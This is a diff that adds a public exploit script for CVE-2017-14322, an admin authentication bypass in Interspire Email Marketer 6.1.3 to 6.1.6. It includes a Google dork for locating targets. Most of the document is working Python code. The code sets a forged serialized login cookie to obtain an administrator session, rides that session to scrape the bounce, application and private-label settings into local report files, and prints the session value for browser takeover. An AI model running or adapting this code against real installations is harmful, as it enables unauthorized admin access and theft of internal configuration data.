@@ -1,0 +1,156 @@
+'''
+# Exploit Title: Interspire Email Marketer - Remote Admin Authentication Bypass
+# Google Dork: intitle:"Control Panel" + emailmarketer
+# Date: 4-22-18
+# Exploit Author: devcoinfet
+# Vendor Homepage: www.interspire.com/emailmarketer 
+# Software Link: Can't legally provide link but can be found on net 
+# Version: [6.1.3-6.1.6]
+# Tested on: Below 6.1.6
+# CVE : CVE-2017-14322
+
+https://security.infoteam.ch/en/blog/posts/narrative-of-an-incident-response-from-compromise-to-the-publication-of-the-weakness.html 
+https://github.com/joesmithjaffa/CVE-2017-14322 
+thanks to above Researchers
+
+1. Description
+
+
+
+this is used like this
+--------------------------
+exploit.py url/email-marketer/admin/index.php
+
+
+2. Proof of Concept
+'''
+
+
+import requests
+import sys
+from bs4 import BeautifulSoup
+from pprint import pprint
+
+
+def cookie_cutter(url):
+    with requests.Session() as s:
+       s.get(url)
+       r = s.get(url)
+       response_regex = r.text
+       print("requesting initial Cookie\n")
+       print(str(r.headers)+"\n")
+       
+       for key,value in s.cookies.items():
+           if key and "IEMSESSIONID" in key:
+          
+              s.cookies.set('IEM_CookieLogin', "YTo0OntzOjQ6InVzZXIiO3M6MToiMSI7czo0OiJ0aW1lIjtpOjE1MDU0NzcyOTQ7czo0OiJyYW5kIjtiOjE7czo4OiJ0YWtlbWV0byI7czo5OiJpbmRleC5waHAiO30%3D")
+       print("Attempting To Posion 2nd request with Forged Cookie\n")
+       print("-" * 25)
+       r = s.get(url)
+       response_regex2 = r.text
+       print response_regex2
+       print(str(r.headers) + "\n")
+       if response_regex != response_regex2:
+
+          for key,value in s.cookies.items():
+              if "IEMSESSIONID" in key:
+                 try:
+                    #using session riding from previous cookie we grab the info we want :)
+                    bounce_info_grab(url,value)
+                    app_info_grab(url,value)
+                    privt_info_grab(url,value)
+                 except:
+                     pass
+                 return value,r.text
+
+
+def bounce_info_grab(url,session_to_ride):
+    url_grab = url+"?Page=Settings&Tab=2"
+    print(url_grab)
+    with requests.Session() as s:
+       s.get(url_grab)
+       s.cookies.set('IEMSESSIONID',session_to_ride)
+       r = s.get(url_grab)
+       response_regex = r.text
+       soup = BeautifulSoup(response_regex,'html5lib')
+       div = soup.find('div', id='div7')
+      
+        
+       outfile = open("bounce_report.txt",'w')
+       dataout = """<html><head>Report</head><title>Report</title>
+                    <body>""" + str(div) +"""</body></html>"""
+       outfile.write(dataout)
+       outfile.close()
+       for divy in div.contents:
+           print(divy)
+          
+def app_info_grab(url,session_to_ride):
+    url_grab = url+"?Page=Settings&Tab=2"
+    print(url_grab)
+    with requests.Session() as s:
+       s.get(url_grab)
+       s.cookies.set('IEMSESSIONID',session_to_ride)
+       r = s.get(url_grab)
+       response_regex = r.text
+       soup = BeautifulSoup(response_regex,'html5lib')
+       div = soup.find('div', id='div1')
+    
+        
+       outfile = open("application_settings_report.txt",'w')
+       dataout = """<html><head>Report</head><title>Report</title>
+                    <body>""" + str(div) +"""</body></html>"""
+       outfile.write(dataout)
+       outfile.close()
+       for divy in div.contents:
+           print(divy)   
+    
+def privt_info_grab(url,session_to_ride):
+    url_grab = url+"?Page=Settings&Tab=2"
+    print(url_grab)
+    with requests.Session() as s:
+       s.get(url_grab)
+       s.cookies.set('IEMSESSIONID',session_to_ride)
+       r = s.get(url_grab)
+       response_regex = r.text
+       soup = BeautifulSoup(response_regex,'html5lib')
+       div = soup.find('div', id='div8')
+     
+        
+       outfile = open("privtlbl_settings_report.txt",'w')
+       dataout = """<html><head>Report</head><title>Report</title>
+                    <body>""" + str(div) +"""</body></html>"""
+       outfile.write(dataout)
+       outfile.close()
+       for divy in div.contents:
+           print(divy)   
+    
+def main():
+    url = sys.argv[1]
+    print  "Evaluating Target:" +url+ """ For CVE-2017-14322"""+"\n"
+    print "-" * 25
+    try:
+       session_rider_value,content = cookie_cutter(url)
+       print "Session Has Been Generated Entering Internal Data Dumping Routine"+"\n"
+       print "-" * 25
+       print "Magic Cookie Generated Modify Existing IEMSESSIONID Value In browser With Below Value "
+       print "-" * 25
+       print  session_rider_value+"\n"
+       print "-" * 25
+    except:
+       print "Target Is Not Vulnerable"
+       pass
+   
+    
+
+main()
+
+'''
+When Running this, if it is succesful check for 3 files in the directory of exploit to find crucial internal configs in Html format
+do not use this for bad just dont do it please.
+ 
+
+3. Solution:
+   
+Update to version 6.1.6 atleast
+http://www.interspire.com/emailmarketer 
+'''
